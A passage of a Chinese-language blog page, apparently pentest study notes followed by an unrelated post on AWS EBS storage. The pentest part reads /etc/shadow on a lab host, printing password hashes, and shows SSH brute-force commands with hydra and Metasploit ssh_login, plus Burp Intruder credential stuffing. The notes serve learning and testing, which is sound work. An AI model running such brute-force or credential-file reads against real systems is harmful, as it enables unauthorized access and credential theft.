class="line">/usr/share/doc/db3-devel-3.2.9/ref/build_unix/flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/upgrade.3.2/set_flags.html</span><br><span class="line">/usr/share/man/man3/fegetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/fesetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/tgetflag.3x.gz</span><br><span class="line">/usr/share/man/man3/tigetflag.3x.gz</span><br><span class="line">/usr/share/man/man8/rootflags.8.gz</span><br><span class="line">/usr/include/bits/waitflags.h</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /usr/sbin/rootflags</span><br><span class="line">ELhP�A�q��.u�V����������P�s������jatus)Z</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">User root may run the following commands on this host:</span><br><span class="line">    (ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/var/spool/news:</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">mailnull:x:47:47::/var/spool/mqueue:/dev/null</span><br><span class="line">rpm:x:37:37::/var/lib/rpm:/bin/bash</span><br><span class="line">xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false</span><br><span class="line">rpc:x:32:32:Portmapper RPC user:/:/bin/false</span><br><span class="line">rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nscd:x:28:28:NSCD Daemon:/:/bin/false</span><br><span class="line">ident:x:98:98:pident user:/:/sbin/nolcat /etc/passwd</span><br><span class="line">ogin</span><br><span class="line">radvd:x:75:75:radvd user:/:/bin/false</span><br><span class="line">postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/var/www:/bin/false</span><br><span class="line">squid:x:23:23::/var/spool/squid:/dev/null</span><br><span class="line">pcap:x:77:77::/var/arpwatch:/bin/nologin</span><br><span class="line">john:x:500:500::/home/john:/bin/bash</span><br><span class="line">harold:x:501:501::/home/harold:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$1$XROmcfDX<span class="variable">$tF93GqnLHOJeGRHpaNyIs0</span>:14513:0:99999:7:::</span><br><span class="line">bin:*:14513:0:99999:7:::</span><br><span class="line">daemon:*:14513:0:99999:7:::</span><br><span class="line">adm:*:14513:0:99999:7:::</span><br><span class="line">lp:*:14513:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:14513:0:99999:7:::</span><br><span class="line">shutdown:*:14513:0:99999:7:::</span><br><span class="line">halt:*:14513:0:99999:7:::</span><br><span class="line">mail:*:14513:0:99999:7:::</span><br><span class="line">news:*:14513:0:99999:7:::</span><br><span class="line">uucp:*:14513:0:99999:7:::</span><br><span class="line">operator:*:14513:0:99999:7:::</span><br><span class="line">games:*:14513:0:99999:7:::</span><br><span class="line">gopher:*:14513:0:99999:7:::</span><br><span class="line">ftp:*:14513:0:99999:7:::</span><br><span class="line">nobody:*:14513:0:99999:7:::</span><br><span class="line">mailnull:!!:14513:0:99999:7:::</span><br><span class="line">rpm:!!:14513:0:99999:7:::</span><br><span class="line">xfs:!!:14513:0:99999:7:::</span><br><span class="line">rpc:!!:14513:0:99999:7:::</span><br><span class="line">rpcuser:!!:14513:0:99999:7:::</span><br><span class="line">nfsnobody:!!:14513:0:99999:7:::</span><br><span class="line">nscd:!!:14513:0:99999:7:::</span><br><span class="line">ident:!!:14513:0:99999:7:::</span><br><span class="line">radvd:!!:14513:0:99999:7:::</span><br><span class="line">postgres:!!:14513:0:99999:7:::</span><br><span class="line">apache:!!:14513:0:99999:7:::</span><br><span class="line">squid:!!:14513:0:99999:7:::</span><br><span class="line">pcap:!!:14513:0:99999:7:::</span><br><span class="line">john:$1<span class="variable">$zL4</span>.MR4t<span class="variable">$26N4YpTGceBO0gTX6TAky1</span>:14513:0:99999:7:::</span><br><span class="line">harold:$1$Xx6dZdOd<span class="variable">$IMOGACl3r757dv17LZ9010</span>:14513:0:99999:7:::</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>通過root身分可以看到不少機敏資訊</li>
-</ul>
-<h3 id="Brute-Force-Attacks"><a href="#Brute-Force-Attacks" class="headerlink" title="Brute Force Attacks"></a><strong>Brute Force Attacks</strong></h3><p>從現實角度出發</p>
-<ul>
-<li><p>評估中看到SSH，嘗試對其進行暴力破解，或默認憑據</p>
-<ul>
-<li>測試密碼強度</li>
-<li>弱密碼、默認密碼</li>
-</ul>
-</li>
-<li><p>確認藍隊的表現</p>
-<ul>
-<li>評估對方是否能偵測到攻擊</li>
-<li>攻擊是否有告警</li>
-</ul>
-</li>
-<li><p>hydra - SSH 錯誤</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V**</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-14 16:23:58</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.19.140:22/</span><br><span class="line">[ERROR] could not connect to ssh://192.168.19.140:22 - kex error : no match <span class="keyword">for</span> method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt update&amp;&amp; apt full-upgrade -y</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dpkg -l | grep kali-tweaks</span><br><span class="line">ii  kali-tweaks                                    2023.3.2                                all          tool to adjust advanced configuration settings <span class="keyword">for</span> Kali Linux</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# kali-tweaks  </span><br><span class="line">&gt;&gt;&gt; Configuring Samba</span><br><span class="line">&gt; Setting client min protocol to: LANMAN1</span><br><span class="line">&gt; Writing changes to /etc/samba/smb.conf</span><br><span class="line">&gt;&gt;&gt; Configuring SSH</span><br><span class="line">&gt; Enabling wide compatibility</span><br><span class="line">&gt; $ <span class="built_in">cp</span> -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf</span><br><span class="line"></span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃ For more information about Samba configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/samba-configuration/</span><br><span class="line">┃ For more information about SSH configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/ssh-configuration/</span><br><span class="line">┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span><br><span class="line"></span><br><span class="line">&gt; Press Enter to <span class="built_in">continue</span>...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>  enter &gt; 選SSH client &gt; OK</p>
-<p>  <img src="/img/exploit_Untitled_4.png" alt="Untitled"></p>
-<p>  會需要再輸入一次</p>
-<p>  <img src="/img/exploit_Untitled_5.png" alt="Untitled"></p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V</span><br></pre></td></tr></table></figure>
-
-<p>同時開啟MSF，選擇需要的模塊並將選項中的參數填入，執行程式</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">msf6 &gt; **search ssh**</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                              ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution</span><br><span class="line">   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution</span><br><span class="line">   2   auxiliary/scanner/ssh/karaf_login                                                  normal     No     Apache Karaf Login Utility</span><br><span class="line">   3   exploit/apple_ios/ssh/cydia_default_ssh                           2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability                                                                                                    </span><br><span class="line">   4   exploit/unix/ssh/arista_tacplus_shell                             2020-02-02       great      Yes    Arista restricted shell escape (with privesc)</span><br><span class="line">   5   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution</span><br><span class="line">   6   exploit/linux/ssh/ceragon_fibeair_known_privkey                   2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure</span><br><span class="line">   7   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration</span><br><span class="line">....</span><br><span class="line">   43  exploit/linux/ssh/quantum_dxi_known_privkey                       2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure                                                                                                      </span><br><span class="line">   44  exploit/linux/ssh/quantum_vmpro_backdoor                          2014-03-17       excellent  No     Quantum vmPRO Backdoor Command</span><br><span class="line">   45  auxiliary/fuzzers/ssh/ssh_version_15                                               normal     No     SSH 1.5 Version Fuzzer</span><br><span class="line">   46  auxiliary/fuzzers/ssh/ssh_version_2                                                normal     No     SSH 2.0 Version Fuzzer</span><br><span class="line">   47  auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                          normal     No     SSH Key Exchange Init Corruption</span><br><span class="line">   48  post/linux/manage/sshkey_persistence                                               excellent  No     SSH Key Persistence</span><br><span class="line">   49  post/windows/manage/sshkey_persistence                                             good       No     SSH Key Persistence</span><br><span class="line">   **50  auxiliary/scanner/ssh/ssh_login                                                    normal     No     SSH Login Check Scanner**</span><br><span class="line">   51  auxiliary/scanner/ssh/ssh_identify_pubkeys                                         normal     No     SSH Public Key Acceptance Scanner</span><br><span class="line">   52  auxiliary/scanner/ssh/ssh_login_pubkey                                             normal     No     SSH Public Key Login Scanner</span><br><span class="line">   53  exploit/multi/ssh/sshexec                                         1999-01-01       manual     No     SSH User Code Execution</span><br><span class="line">   54  auxiliary/scanner/ssh/ssh_enumusers                                                normal     No     SSH Username Enumeration</span><br><span class="line">   55  auxiliary/fuzzers/ssh/ssh_version_corrupt                                          normal     No     SSH Version Corruption</span><br><span class="line">   56  auxiliary/scanner/ssh/ssh_version                                                  normal     No     SSH Version Scanner</span><br><span class="line">.....</span><br><span class="line">   70  payload/cmd/unix/bind_aws_instance_connect                                         normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)</span><br><span class="line">   71  exploit/linux/ssh/vmware_vrni_known_privkey                       2023-08-29       excellent  No     VMWare Aria Operations <span class="keyword">for</span> Networks (vRealize Network Insight) SSH Private Key Exposure</span><br><span class="line">   72  exploit/linux/ssh/vmware_vdp_known_privkey                        2016-12-20       excellent  No     VMware VDP Known SSH Key                                                                                                                        </span><br><span class="line">   73  exploit/multi/http/vmware_vcenter_uploadova_rce                   2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE</span><br><span class="line">   74  exploit/linux/ssh/vyos_restricted_shell_privesc                   2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation</span><br><span class="line">   75  post/windows/gather/credentials/whatsupgold_credential_dump       2022-11-22       manual     No     WhatsUp Gold Credentials Dump</span><br><span class="line">   76  post/windows/gather/credentials/mremote                                            normal     No     Windows Gather mRemote Saved Password Extraction</span><br><span class="line">   77  exploit/windows/local/unquoted_service_path                       2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation</span><br><span class="line">   78  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                       2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm</span><br><span class="line">   79  auxiliary/scanner/ssh/libssh_auth_bypass                          2018-10-16       normal     No     libssh Authentication Bypass Scanner</span><br><span class="line">   80  exploit/linux/http/php_imap_open_rce                              2018-10-23       good       Yes    php imap_open Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 80, use 80 or use exploit/linux/http/php_imap_open_rce</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 50</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>            <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>            no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none             no        Skip existing credentials stored <span class="keyword">in</span> the current database (Accepted: none, us</span><br><span class="line">                                                er, user&amp;realm)</span><br><span class="line">   PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">   RHOSTS                             <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba</span><br><span class="line">                                                sics/using-metasploit.html</span><br><span class="line">   RPORT             22               <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>            <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME                           no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                      no        File containing <span class="built_in">users</span> and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>            <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> username root</span><br><span class="line">username =&gt; root</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> pass_file /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">pass_file =&gt; /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.19.140</span><br><span class="line">rhosts =&gt; 192.168.19.140</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                    Required  Description</span><br><span class="line">   ----              ---------------                    --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>                              <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>                              no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                                  <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                              no        Try each user/password couple stored <span class="keyword">in</span> the current databa</span><br><span class="line">                                                                  se</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>                              no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                              no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none                               no        Skip existing credentials stored <span class="keyword">in</span> the current database (</span><br><span class="line">                                                                  Accepted: none, user, user&amp;realm)</span><br><span class="line">   PASSWORD                                             no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE         /usr/share/wordlists/metasploit/u  no        File containing passwords, one per line</span><br><span class="line">                     nix_passwords.txt</span><br><span class="line">   RHOSTS            192.168.19.140                     <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/u</span><br><span class="line">                                                                  sing-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT             22                                 <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                              <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                                  <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          root                               no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                                        no        File containing <span class="built_in">users</span> and passwords separated by space, on</span><br><span class="line">                                                                  e pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                              no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                                            no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>                              <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> threads  10</span><br><span class="line">threads =&gt; 10</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> verbose <span class="literal">true</span> </span><br><span class="line">verbose =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="literal">true</span></span><br><span class="line">[*] <span class="built_in">exec</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.19.140:22 - Starting bruteforce</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:admin&#x27;</span></span><br><span class="line">[!] No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456789&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:password&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:iloveyou&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:princess&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:1234567&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345678&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:abc123&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:nicole&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:daniel&#x27;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-
-<h3 id="Credential-Stuffing-and-Password-Spraying"><a href="#Credential-Stuffing-and-Password-Spraying" class="headerlink" title="Credential Stuffing and Password Spraying"></a><strong>Credential Stuffing and Password Spraying</strong></h3><ul>
-<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/</a></li>
-</ul>
-<p><img src="/img/exploit_Untitled_6.png" alt="Untitled"></p>
-<ul>
-<li>開啟這個Proxy及Burp Suite攔截目標網站的登入訊息</li>
-</ul>
-<p><img src="/img/exploit_Untitled_7.png" alt="Untitled"></p>
-<ul>
-<li>burp suite intercept message send to Intruder</li>
-</ul>
-<p><img src="/img/exploit_Untitled_8.png" alt="Untitled"></p>
-<ul>
-<li>修改Attack type &gt; Pitchfork</li>
-</ul>
-<p><img src="/img/exploit_Untitled_9.png" alt="Untitled"></p>
-<ul>
-<li>寫入蒐集到的mail、passwd資訊</li>
-</ul>
-<p><img src="/img/exploit_Untitled_10.png" alt="Untitled"></p>
-<p><img src="/img/exploit_Untitled_11.png" alt="Untitled"></p>
-<ul>
-<li><p>開啟攻擊並進行帳號密碼爆破</p>
-<p>  <img src="/img/exploit_Untitled_12.png" alt="Untitled"></p>
-</li>
-<li><p>可以通過回應訊息內容進行過濾</p>
-</li>
-<li><p>開啟Intruder &gt; Option &gt; Grap - Match &gt; clear &gt; Paste</p>
-</li>
-<li><p>Attack &gt; Pause</p>
-<ul>
-<li>check box 有打勾表示網頁有顯示Grep - Match的內容，可以透過這快速知道登入情況</li>
-</ul>
-</li>
-</ul>
-<p><img src="/img/exploit_Untitled_13.png" alt="Untitled"></p>
-<p><img src="/img/exploit_Untitled_14.png" alt="Untitled"></p>
-<p><img src="/img/exploit_Untitled_15.png" alt="Untitled"></p>
-<ul>
-<li>通過這個方式去尋找可能有弱密碼的可能</li>
-<li>爆破需要時間，若大量發送可能會觸發防火牆告警</li>
-<li>通常需要帳號&#x2F;密碼表讓爆破可以嘗試的內容更多</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-EBS" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/EBS/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.081Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/EBS/">
-        AWS EC2 Instance Storage
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="EBS-Volume-彈性塊存儲"><a href="#EBS-Volume-彈性塊存儲" class="headerlink" title="EBS Volume 彈性塊存儲"></a>EBS Volume 彈性塊存儲</h3><p><img src="/img/EBS.png" alt="Untitled"></p>
-<ul>
-<li>網路驅動器</li>
-<li>實例運行時將其連接到實例上</li>
-<li>實例即使終止，EBS也允許我們保留數據</li>
-<li>重新創建一個實例，並裝載到之前同一個EBS可以取回數據</li>
-<li>在CCP Level 一次只能裝載到一個實例</li>
-<li>創建EBS時，它將綁訂到特定的可用區域(AZ)<ul>
-<li>假設使用us-east-1a則無法連接到us-east-1b</li>
-<li>執行快照，則可以在不同的可用性區域之間移動Volume</li>
-</ul>
-</li>
-<li>每月提供30GB免費存儲類型的通用或SSD或磁性</li>
-<li>使用網路在實例跟EBS中通訊</li>
-<li>可快速地從EC2實例分離並連接到另一個實例</li>
-<li>需提前調配容量</li>
-<li>可為配置容量付費，如果希望獲得更好的性能或更大的容量</li>
-<li>長期存儲</li>
-</ul>
-<h3 id="EC2-Instance-Store-→-臨時存儲"><a href="#EC2-Instance-Store-→-臨時存儲" class="headerlink" title="EC2 Instance Store → 臨時存儲"></a>EC2 Instance Store → 臨時存儲</h3><p>如果需要更高性能的硬體磁碟，使用EC2 Instance Store</p>
-<p>連接到真實的硬體服務器</p>
-<p>使用EC2實例存儲實現更好的IO性能</p>
-<p>如果希望獲得極高的磁盤性能，可以選擇這方案</p>
-<p>如果停止或終止EC2實例，存儲將丟失</p>
-<p>如果有緩衝區、緩存、如果希望有臨時數據、臨時內容</p>
-<p>服務器發生故障，將面臨巨大損失的風險，連接到EC2實例的硬體也將發生故障</p>
-<p>全部責任是確保備份，並根據需要進行複製</p>
-<h3 id="終止時刪除"><a href="#終止時刪除" class="headerlink" title="終止時刪除"></a>終止時刪除</h3><p><img src="/img/EBS1.png" alt="Untitled"></p>
-<ul>
-<li>默認情況下，Delete on Termination 對於Root Volume 處於選中狀態<ul>
-<li>Root EBS Volume 將與被終止的實例一起刪除</li>
-</ul>
-</li>
-<li>對於新的EBS Volume ，此選項未處於選中狀態<ul>
-<li>任何其他連接的EBS Volume 都不會被刪除</li>
-</ul>
-</li>
-<li>如果希望終止實例時保留Root Volume，則可以禁用Root Volume 的Delete on Termination</li>
-</ul>
-<h3 id="EBS-Snapshots"><a href="#EBS-Snapshots" class="headerlink" title="EBS Snapshots"></a>EBS Snapshots</h3><ul>
-<li>EBS快照是EBS Volume 在任意時間點的備份</li>
-<li>不必將EBS Volume 從EC2實例中分離</li>
-<li>可以跨不同的可用性區域甚至跨不同的區域複製這些EBS快照</li>
-</ul>
-<p><img src="/img/EBS2.png" alt="Untitled"></p>
-<ul>
-<li><p>封存快照 Archive</p>
-<p>  <img src="/img/EBS3.png" alt="Untitled"></p>
-<ul>
-<li>快照移動到封存層</li>
-<li>成本最多可以降低75%</li>
-<li>恢復歸檔將需要24~72小時</li>
-</ul>
-</li>
-<li><p>回收站EBS快照 Recycle Bin</p>
-<ul>
-<li>如果刪除EBS Snapshots，不是永久刪除，會在Recycle Bin中</li>
-<li>可以從意外刪除中恢復<ul>
-<li>可以設置為一天到一年的保留時間</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>快速快照恢復 Fast Snapshot Restore (FSR)</p>
-<ul>
-<li>強制快照進行完全初始化，以便在第一次使用時沒有延遲</li>
-<li>如果快照很大，需要初始化EBS或需要快速從其中實例化出來</li>
-<li>需要花費大量資金</li>
-</ul>
-</li>
-</ul>
-<h3 id="EBS-Volume-Types"><a href="#EBS-Volume-Types" class="headerlink" title="EBS Volume Types"></a>EBS Volume Types</h3><p><img src="/img/EBS4.png" alt="Untitled"></p>
-<ul>
-<li>6 types<ul>
-<li>gp2&#x2F;gp3 (SSD)<ul>
-<li>平衡各種工作負載的價格和性能</li>
-<li>為了實現經濟高效的存儲延遲</li>
-<li>gp2<ul>
-<li>具有低延遲的經濟高效的存儲</li>
-<li>可將其用於系統引導Volume</li>
-<li>1GB~16TB不等</li>
-<li>有些較小的gp2 Volume 可以爆發到3000 IOPS</li>
-<li>Volume 的大小和IOPS關聯</li>
-<li>IOPS、吞吐量連接再一起無法單獨設置</li>
-<li>如果增加IOPS、Volume GB數，將獲得3個以上的IOPS，最高到16000 IOPS ⇒ 5334 GB(最大值)</li>
-</ul>
-</li>
-<li>gp3<ul>
-<li>新一代Volume</li>
-<li>可獨立設置IOPS和吞吐量</li>
-<li>提供了3000 IOPS的基線和每秒125MB的吞吐量</li>
-<li>可以將IOPS增加到16000</li>
-<li>吞吐量增加到每秒1000MB</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Provisioned IOPS (PIOPS SSD) Input&#x2F;Output Operations Per Second<ul>
-<li><p>用於需要維持IOPS性能的關鍵業務應用程式</p>
-</li>
-<li><p>需要大量的IOPS(可能超過16000的應用程式)</p>
